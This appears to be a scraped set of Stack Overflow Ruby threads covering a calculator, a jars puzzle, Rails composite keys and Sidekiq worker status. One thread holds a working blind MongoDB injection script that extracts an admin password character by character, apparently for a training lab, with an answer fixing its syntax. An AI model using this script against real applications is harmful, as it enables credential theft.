{"reputation": 45, "user_id": 11262304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dff275d7be4c4f02a5648c68a9b28034?s=128&d=identicon&r=PG&f=1", "display_name": "newkidontheblock", "link": "https://stackoverflow.com/users/11262304/newkidontheblock"}, "reply_to_user": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 1, "creation_date": 1559412295, "post_id": 56199662, "comment_id": 99415596, "body": "@J&#246;rgWMittag I see my error now :) thanks!"}], "answers": [{"comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558207517, "post_id": 56199677, "comment_id": 99026995, "body": "Two variants: <code>&quot;-+*&#47;&quot;.include? operator</code> and <code>operator.match? &#47;[-+*\\&#47;]&#47;</code> (or <code>operator.match? &#47;\\+|-|\\*|\\&#47;&#47;</code>)."}, {"owner": {"reputation": 45, "user_id": 11262304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dff275d7be4c4f02a5648c68a9b28034?s=128&d=identicon&r=PG&f=1", "display_name": "newkidontheblock", "link": "https://stackoverflow.com/users/11262304/newkidontheblock"}, "edited": false, "score": 0, "creation_date": 1559411684, "post_id": 56199677, "comment_id": 99415438, "body": "@Ursus thank you for the answer! Makes a lot of sense!"}], "tags": [], "owner": {"reputation": 27144, "user_id": 3857758, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/58c4295826435f049b7fc32b98c240f9?s=128&d=identicon&r=PG&f=1", "display_name": "Ursus", "link": "https://stackoverflow.com/users/3857758/ursus"}, "is_accepted": true, "score": 3, "last_activity_date": 1558188634, "last_edit_date": 1558188634, "creation_date": 1558188202, "answer_id": 56199677, "question_id": 56199662, "link": "https://stackoverflow.com/questions/56199662/how-to-use-include-to-capture-multiple-options-resulting-in-same-operation/56199677#56199677", "title": "How to use .include? to capture multiple options resulting in same operation", "body": "<p>In this way</p>\n\n<pre><code>if %w(+ - * /).include?(operator)\n</code></pre>\n\n<p>a shorter way for this one</p>\n\n<pre><code>if [\"+\", \"-\", \"*\", \"/\"].include?(operator)\n</code></pre>\n\n<p>This makes sense, don't you think? You're checking that the operator is included in some options. In this case the options are four strings, the symbols for the four basic mathematical operations.</p>\n"}, {"tags": [], "owner": {"reputation": 73209, "user_id": 290394, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d7908f05c89e965f6bc5308ad6f41256?s=128&d=identicon&r=PG", "display_name": "steenslag", "link": "https://stackoverflow.com/users/290394/steenslag"}, "is_accepted": false, "score": 1, "last_activity_date": 1558214540, "creation_date": 1558214540, "answer_id": 56202943, "question_id": 56199662, "link": "https://stackoverflow.com/questions/56199662/how-to-use-include-to-capture-multiple-options-resulting-in-same-operation/56202943#56202943", "title": "How to use .include? to capture multiple options resulting in same operation", "body": "<p>A <code>case when</code> control structure lets you specify multiple conditionals. Sounds hard, is actually easy:</p>\n\n<pre><code>puts case operator\n  when  '+', '-', 'x', '/' then calculator(first_num, second_num, operator)\n  else \"That wasn't a valid selection.\"\nend\n</code></pre>\n"}], "owner": {"reputation": 45, "user_id": 11262304, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dff275d7be4c4f02a5648c68a9b28034?s=128&d=identicon&r=PG&f=1", "display_name": "newkidontheblock", "link": "https://stackoverflow.com/users/11262304/newkidontheblock"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 56199677, "answer_count": 2, "score": 0, "last_activity_date": 1558214540, "creation_date": 1558188037, "question_id": 56199662, "link": "https://stackoverflow.com/questions/56199662/how-to-use-include-to-capture-multiple-options-resulting-in-same-operation", "title": "How to use .include? to capture multiple options resulting in same operation", "body": "<p>I am writing a simple calculator that asks the user what calculation she wants to perform with a choice between '+', '-', '*' and '/'. </p>\n\n<p>The code works when I separate each option with ||. However, I would prefer to use .include? to avoid repetition. </p>\n\n<pre><code>while play_again != \"N\"\n  puts \"Enter a first number:\"\n  first_num = gets.chomp.to_i\n  puts \"Enter a second number:\"\n  second_num = gets.chomp.to_i\n  puts \"Which operation would you like to perform? '+', '-', 'x', '/'\"\n  operator = gets.chomp\n  if operator == \"+\" || operator == \"-\" || operator == \"x\" || operator   \n  == \"/\"\n    puts calculator(first_num, second_num, operator)\n  else\n    puts \"That wasn't a valid selection.\"\n  end\n  puts \"Do you want to calculate something else? (Y/N)\"\n  play_again = gets.chomp\nend\n</code></pre>\n\n<p>I tried to rewrite the line starting with <code>if operator</code> with <code>if operator.include?(%w[+ - X /].to_s)</code> but this doesn't capture the user input properly and always puts \" That wasn't a valid selection.\"</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 1141, "user_id": 5580181, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/ac9846aee6afef6288371bcc5a933396?s=128&d=identicon&r=PG&f=1", "display_name": "Daniele Licitra", "link": "https://stackoverflow.com/users/5580181/daniele-licitra"}, "edited": false, "score": 0, "creation_date": 1558177901, "post_id": 56198073, "comment_id": 99020022, "body": "Hi. What are the rules of the game? Which operation can be made? Please add more info to the problem."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "reply_to_user": {"reputation": 1141, "user_id": 5580181, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/ac9846aee6afef6288371bcc5a933396?s=128&d=identicon&r=PG&f=1", "display_name": "Daniele Licitra", "link": "https://stackoverflow.com/users/5580181/daniele-licitra"}, "edited": false, "score": 0, "creation_date": 1558207962, "post_id": 56198073, "comment_id": 99027081, "body": "Why haven&#39;t you responded to @Daniele&#39;s question?"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558210676, "post_id": 56198073, "comment_id": 99027627, "body": "At this time there are 4 votes to close the question. If you don&#39;t want it closed (which requires just one more vote) you need to clarify your question. I think you need something like the second sentence of my answer (which you are welcome to borrow), assuming my understanding is correct. I&#39;ve seen enough puzzles about shifting liquids among three bottles that I&#39;m pretty confident that I see what you are trying to do."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558234445, "post_id": 56198073, "comment_id": 99030832, "body": "The question is on hold, but its not too late to fix it. Who knows, if you clarify the question the hold may be lifted."}], "answers": [{"comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1558226278, "post_id": 56202381, "comment_id": 99029978, "body": "You put in the work to solve a problem you&#39;re gonna get an upvote. It&#39;s the rules! \ud83d\ude01"}], "tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 1, "last_activity_date": 1558234281, "last_edit_date": 1558234281, "creation_date": 1558209294, "answer_id": 56202381, "question_id": 56198073, "link": "https://stackoverflow.com/questions/56198073/jars-puzzle-question-initial-configuration-and-final-configuration-in-ruby/56202381#56202381", "title": "jars puzzle question ,Initial configuration and final configuration in ruby", "body": "<p>The following is not an answer but an extended comment. (No upvotes please.)</p>\n\n<p>I assume that transfers are such that if some or all of the contents of Jar A are transferred to Jar B, after the transfer has been completed jar A will be empty or jar B will be full.</p>\n\n<p>Here's a start (not a solution).</p>\n\n<pre><code>class Jars\n  attr_accessor :content\n  attr_reader :capacity, :target\n\n  def initialize(capacity, content, target)\n    @capacity, @content, @target = capacity, content, target\n  end\n\n  def transfer_to(other_jar)\n     if self.content &lt;= other_jar.capacity - other_jar.content\n       # jar self is emptied\n       other_jar.content += self.content\n       self.content = 0\n     else\n       # other_jar becomes full\n       self.content -= other_jar.capacity - other_jar.content\n       other_jar.content = other_jar.capacity\n     end\n  end\nend\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>def success?(*jars)\n  jars.all? { |jar| jar.content == jar.target }\nend\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>jar8 = Jars.new(8, 8, 4)\n  #=&gt; #&lt;Jars:0x000057c7edc841e8 @capacity=8, @content=8&gt; \njar5 = Jars.new(5, 0, 4)\n  #=&gt; #&lt;Jars:0x000057c7ede176e0 @capacity=5, @content=0&gt; \njar3 = Jars.new(3, 0, 0)\n  #=&gt; #&lt;Jars:0x000057c7ede422a0 @capacity=3, @content=0&gt;\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>jar8.content #=&gt; 8\njar5.content #=&gt; 0\njar3.content #=&gt; 0\n\nsuccess?(jar3, jar5, jar8) #=&gt; false\n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>jar8.transfer_to(jar3)\njar8.content #=&gt; 5\njar5.content #=&gt; 0\njar3.content #=&gt; 3\n\nsuccess?(jar3, jar5, jar8) #=&gt; false \n</code></pre>\n\n<h1><p></p></h1>\n\n<pre><code>jar3.transfer_to(jar5)\njar8.content #=&gt; 5\njar5.content #=&gt; 3\njar3.content #=&gt; 0\n\nsuccess?(jar3, jar5, jar8) #=&gt; false \n</code></pre>\n\n<p>and so on. Can you come up with an algorithm that results in <code>success?(jar3, jar5, jar8) #=&gt; true</code>? </p>\n"}], "owner": {"reputation": 3, "user_id": 11301518, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Zk-H2reaZYQ/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rfPYRsxo8UXzU-7VKdZ2bZs6fvMaA/mo/photo.jpg?sz=128", "display_name": "adarsh", "link": "https://stackoverflow.com/users/11301518/adarsh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "closed_date": 1558226184, "answer_count": 1, "score": -3, "last_activity_date": 1558234281, "creation_date": 1558175079, "last_edit_date": 1558176339, "question_id": 56198073, "link": "https://stackoverflow.com/questions/56198073/jars-puzzle-question-initial-configuration-and-final-configuration-in-ruby", "closed_reason": "Needs more focus", "title": "jars puzzle question ,Initial configuration and final configuration in ruby", "body": "<p>Suppose there are 3 jars with some maximum capacity, Let it be 8 litres, 5 litres, 3 litres.</p>\n\n<p>Initial configuration is 8 litres, 0 litres, 0 litres, and the final configuration be 4 litres, 4 litres, 0 litres.</p>\n\n<p>The program should produce a sequence of operations to reach the final configuration from initial configuration, or return a message if no path exists.</p>\n\n<p>Your program should be able to work out the steps for any initial and final config as given by the User.</p>\n\n<p>i am totally confused..\nplease give me any suggestion..........</p>\n\n<p><a href=\"https://i.stack.imgur.com/vDpoo.png\" rel=\"nofollow noreferrer\">puzzle output</a></p>\n"}, {"tags": ["mysql", "ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 1580, "user_id": 4041883, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CE0SX.jpg?s=128&g=1", "display_name": "CAmador", "link": "https://stackoverflow.com/users/4041883/camador"}, "edited": false, "score": 0, "creation_date": 1558177281, "post_id": 56197840, "comment_id": 99019904, "body": "Take a look at <a href=\"https://github.com/composite-primary-keys/composite_primary_keys\" rel=\"nofollow noreferrer\">composite_primary_keys</a> gem, it may help."}, {"owner": {"reputation": 75558, "user_id": 544825, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/UFdOO.png?s=128&g=1", "display_name": "max", "link": "https://stackoverflow.com/users/544825/max"}, "edited": false, "score": 0, "creation_date": 1558189570, "post_id": 56197840, "comment_id": 99022784, "body": "The whole design seems precarious, how are you going to handle potential duplicates and the fact that cascades may create orphaned records in the rates history table? The whole compound pk idea is most likely a dead end."}], "answers": [{"tags": [], "owner": {"reputation": 7811, "user_id": 379779, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/4c3bd8d869b7e1caa45485b0b3e126a4?s=128&d=identicon&r=PG", "display_name": "zawhtut", "link": "https://stackoverflow.com/users/379779/zawhtut"}, "is_accepted": false, "score": 0, "last_activity_date": 1558329645, "creation_date": 1558329645, "answer_id": 56214691, "question_id": 56197840, "link": "https://stackoverflow.com/questions/56197840/rails-add-foreign-key-to-primary-key-of-multiple-columns/56214691#56214691", "title": "Rails :Add foreign key to primary key of multiple columns", "body": "<p>Instead of using any string, you should use currency code for \"from\" and \"to\" columns. </p>\n\n<p>Then, name them as \"from_currency_code\" and \"to_currency_code\".</p>\n\n<p>Then mark those \"from_currency_code\" and \"to_currency_code\",\"modified_date_time\" as combined unique key as follow.</p>\n\n<pre><code>add_index :currency_update, [:from_currency_code, :to_currency_code, :modified_date_time], :unique =&gt; true\n</code></pre>\n"}], "owner": {"reputation": 133, "user_id": 8009447, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-NsF_W2IXiRA/AAAAAAAAAAI/AAAAAAAAAfE/eTwrtffBE-M/photo.jpg?sz=128", "display_name": "Frieda", "link": "https://stackoverflow.com/users/8009447/frieda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 223, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558329645, "creation_date": 1558173032, "last_edit_date": 1558202842, "question_id": 56197840, "link": "https://stackoverflow.com/questions/56197840/rails-add-foreign-key-to-primary-key-of-multiple-columns", "title": "Rails :Add foreign key to primary key of multiple columns", "body": "<p>I have a table exchangeablecurrencies which have primary key consists of two columns, from and to. I want to create table rate_history with foreign key to exchangable currencies.</p>\n\n<p>I have tried creating two foreign key for both primary key mentioned.</p>\n\n<pre><code>class CreateExchangeableCurrencies &lt; ActiveRecord::Migration[5.2]\n  def change\n    create_table :exchangeable_currencies, primary_key: %i[from to] do |t|\n      t.string :from\n      t.string :to\n\n      t.timestamps\n    end\n  end\nend\n\nclass CreateRateHistories &lt; ActiveRecord::Migration[5.2]\n  def change\n    create_table :rate_histories do |t|\n      t.date :date\n      t.float :rate\n      t.string :from\n      t.string :to\n      t.timestamps\n    end\n  add_foreign_key :rate_histories, :exchangeable_currencies,\n                column: :from, primary_key: :from, on_delete: \n  :cascade\n add_foreign_key :rate_histories, :exchangeable_currencies,\n                column: :to, primary_key: :to, on_delete: :cascade\n  end\nend\n</code></pre>\n\n<p>Here is the error</p>\n\n<p>Column <code>to</code> on table <code>rate_histories</code> does not match column <code>to</code> on <code>exchangeable_currencies</code>, which has type <code>varchar(255)</code>. To resolve this issue, change the type of the <code>to</code> column on <code>rate_histories</code> to be :string. (For example <code>t.string :to</code>).</p>\n"}, {"tags": ["ruby", "mongodb", "code-injection"], "answers": [{"comments": [{"owner": {"reputation": 2151, "user_id": 10068463, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c3df811097b7fb8fef67238aad1151ca?s=128&d=identicon&r=PG&f=1", "display_name": "Nate", "link": "https://stackoverflow.com/users/10068463/nate"}, "edited": false, "score": 0, "creation_date": 1558232950, "post_id": 56196540, "comment_id": 99030644, "body": "Also, if you don&#39;t actually have a condition and just want to loop forever, you can use <code>loop do</code> instead of <code>while true</code>. It&#39;s a little more readable (and I imagine faster, because there&#39;s no condition to check every iteration, though I can&#39;t confirm that)."}], "tags": [], "owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "is_accepted": false, "score": 3, "last_activity_date": 1558160961, "creation_date": 1558160961, "answer_id": 56196540, "question_id": 56196451, "link": "https://stackoverflow.com/questions/56196451/unexpected-keyword-end-mongodb-injection/56196540#56196540", "title": "unexpected keyword_end MongoDB Injection", "body": "<p>There is a typo <code>while</code> is a keyword and need to be written in downcase.</p>\n\n<pre><code>require 'httparty'\n\nURL = \"ptl-eb7cd0e0-778a277a.libcurl.so\"\n\ndef check?(str)\n  resp = HTTParty.get(\n    \"http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00\"\n  )\n\n  return resp.body =~ /&gt;admin&lt;/\nend\n\n\n# puts check?(\"d\").inspect\n# puts check?(\"aaa\").inspect\n\nCHARSET = ('a'..'z').to_a + ('0'..'9').to_a + ['-']\npassword = \"\"\n\nwhile true                      # `while` needs to be downcase\n  CHARSET.each do |c|\n    puts \"Trying: #{c} for #{password}\"\n    test = password + c\n    if check?(\"^#{test}.*$\") \n      password += c\n      puts password\n      break\n    end\n  end\nend\n</code></pre>\n\n<p>Btw. proper indention and some white improves readability a lot.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 12137366, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-GunG1R6hyHs/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3re7AR8DlfJ457lJXdum9Pw7ITLAnw/photo.jpg?sz=128", "display_name": "Sushant Kamble", "link": "https://stackoverflow.com/users/12137366/sushant-kamble"}, "is_accepted": false, "score": 0, "last_activity_date": 1569755624, "last_edit_date": 1569755624, "creation_date": 1569736003, "answer_id": 58152612, "question_id": 56196451, "link": "https://stackoverflow.com/questions/56196451/unexpected-keyword-end-mongodb-injection/58152612#58152612", "title": "unexpected keyword_end MongoDB Injection", "body": "<p>Its an issue with httparty gem.\nFirst, install the same. also I made some changes in code.\nThe code is running but still not getting the result.</p>\n\n<p>I have made below changes :</p>\n\n<p>require 'httparty'</p>\n\n<h1>URL=(URI.encode 'myurl')</h1>\n\n<p>def check?(str)\n  resp = HTTParty.get(URI.encode \"<a href=\"http://myurl/?search=admin%27%20%26%26%20this.password.match(#/\" rel=\"nofollow noreferrer\">http://myurl/?search=admin%27%20%26%26%20this.password.match(#/</a>{str}/)%00\")\n  return resp.body =~ />admin\n\n<p>puts check?(\"5\").inspect\nputs check?(\"aaa\").inspect </p>\n\n<p>It is recommended to use URI.encode function.\nI still trying to get the desired output. \nI hope I will get the result.</p>\n\n<p>You can modify the script or let me know if you had success in running the script. </p>\n"}], "owner": {"reputation": 7, "user_id": 11154383, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d519f20093f19ad422ca0ed23f0e57c6?s=128&d=identicon&r=PG&f=1", "display_name": "Mado", "link": "https://stackoverflow.com/users/11154383/mado"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1569755624, "creation_date": 1558159888, "question_id": 56196451, "link": "https://stackoverflow.com/questions/56196451/unexpected-keyword-end-mongodb-injection", "title": "unexpected keyword_end MongoDB Injection", "body": "<p>im doing one of the tasks to retrieve more information from the NoSQL database using ruby .everytime i run the code im getting syntax error</p>\n\n<pre><code>    require 'httparty'\n    URL=\"ptl-eb7cd0e0-778a277a.libcurl.so\"\n    def check?(str)\n    resp = HTTParty.get(\"http://#{URL}/? \n    search=admin%27%20%26%26%20this.password.match(/#{str}/)%00\")\n\n    return resp.body =~ /&gt;admin&lt;/\n    end\n\n\n    #puts check?(\"d\").inspect\n    #puts check?(\"aaa\").inspect\n\n    CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']\n    password = \"\"\n\n    While true\n    CHARSET.each do |c|\n    puts \"Trying: #{c} for #{password}\"\n    test = password+c\n    if check?(\"^#{test}.*$\") \n    password+=c\n    puts password\n    break\n    end\n    end\n    end\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "sidekiq"], "comments": [{"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558155668, "post_id": 56195034, "comment_id": 99016115, "body": "Yes you are right, the parser knows nothing about the internals of the worker. If you want them to share for example a counter then you must pass a reference form the worker to the parser instance. What is <code>at 5</code> doing? Can you elaborate on that?"}, {"owner": {"reputation": 11, "user_id": 11177351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be2eff2939880d2a2e025ad0ff9eaf72?s=128&d=identicon&r=PG&f=1", "display_name": "Michael C", "link": "https://stackoverflow.com/users/11177351/michael-c"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558187034, "post_id": 56195034, "comment_id": 99022172, "body": "at is a method from the sidekiq status class that allows the pct_complete of a worker to be updated/stored. I was thinking about passing a reference into the class as arguments, but I don&#39;t know what needs to be passed. I could easily pass any of the worker info, but I none of that would allow me to access the scope where I can use the worker methods."}, {"owner": {"reputation": 11, "user_id": 11177351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be2eff2939880d2a2e025ad0ff9eaf72?s=128&d=identicon&r=PG&f=1", "display_name": "Michael C", "link": "https://stackoverflow.com/users/11177351/michael-c"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558278898, "post_id": 56195034, "comment_id": 99039533, "body": "I think what I am going to do for the time being is save the pct_complete intermittently in the db. I feel it is a work around, but i&#39;d rather have a working solution with potentially a little technical debt, then nothing at all. Unless anyone has a better solution."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 11177351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be2eff2939880d2a2e025ad0ff9eaf72?s=128&d=identicon&r=PG&f=1", "display_name": "Michael C", "link": "https://stackoverflow.com/users/11177351/michael-c"}, "edited": false, "score": 0, "creation_date": 1558561634, "post_id": 56248943, "comment_id": 99147184, "body": "I can&#39;t get the <code>#at</code> method to take a <code>jid</code>. That is something I investigated to no avail. I ended up just updating a column in the db and querying that column for the status of the job. To your last point. I am using a streaming parser to read the file without loading the file into memory to stay under a memory threshold. I&#39;d love to parallelize it more, but, I can&#39;t see any other way other than to have multiple workers reading the same file, and looking for different tags, and doing certain actions based on what tag they are supposed to be looking for."}, {"owner": {"reputation": 11, "user_id": 11177351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be2eff2939880d2a2e025ad0ff9eaf72?s=128&d=identicon&r=PG&f=1", "display_name": "Michael C", "link": "https://stackoverflow.com/users/11177351/michael-c"}, "edited": false, "score": 0, "creation_date": 1558561988, "post_id": 56248943, "comment_id": 99147270, "body": "I opted to use a streaming parser as opposed to a DOM parser because the JSON files can be quite large( &gt; 2gb) fairly easily."}], "tags": [], "owner": {"reputation": 1, "user_id": 6317771, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dVEXX.jpg?s=128&g=1", "display_name": "thegreyfellow", "link": "https://stackoverflow.com/users/6317771/thegreyfellow"}, "is_accepted": false, "score": 0, "last_activity_date": 1558496001, "creation_date": 1558496001, "answer_id": 56248943, "question_id": 56195034, "link": "https://stackoverflow.com/questions/56195034/updating-status-of-worker-from-class-within-the-worker/56248943#56248943", "title": "Updating status of worker from class within the worker", "body": "<p>If you can make Sidekiq::Status <code>#at</code> method take the <code>jid</code> of the job to update and it's current status, then yes it is possible. Maybe you could follow up on this <a href=\"https://github.com/utgarda/sidekiq-status/issues/140\" rel=\"nofollow noreferrer\">issue</a> it seems the same as the one you have.</p>\n\n<p>If I may suggest to actually use Sidekiq's power to parallelize the parser's job, into more workers instead of having one worker doing the job since you have the json in memory you can spin a job for each part of the json and whenever one of them is done, it should store its status somewhere accessible between all jobs like the DB for example.</p>\n"}], "owner": {"reputation": 11, "user_id": 11177351, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be2eff2939880d2a2e025ad0ff9eaf72?s=128&d=identicon&r=PG&f=1", "display_name": "Michael C", "link": "https://stackoverflow.com/users/11177351/michael-c"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 80, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558496001, "creation_date": 1558139498, "last_edit_date": 1558139902, "question_id": 56195034, "link": "https://stackoverflow.com/questions/56195034/updating-status-of-worker-from-class-within-the-worker", "title": "Updating status of worker from class within the worker", "body": "<p>I have a worker that downloads a JSON from s3, then a streaming JSON parser (Oj Saj) that parses the file into my db. I can update the worker status from the worker's class, but once I am inside the parser class it is outside the scope of the worker (or so it appears to me)</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class Worker\n\n  include Sidekiq::Worker\n  include Sidekiq::Status::Worker\n\n\n\n  class SajParser &lt;&lt; Oj::Saj\n\n    at 5 #this doesn't update the status of the worker\n\n  end\n\n  def perform()\n\n    at 5 #this does update the status of the worker\n\n  end\n\nend\n\n</code></pre>\n\n<p>I would like a solution that allows me to update the status of the worker as the parsers goes over the JSON and inserts it into the db.</p>\n"}]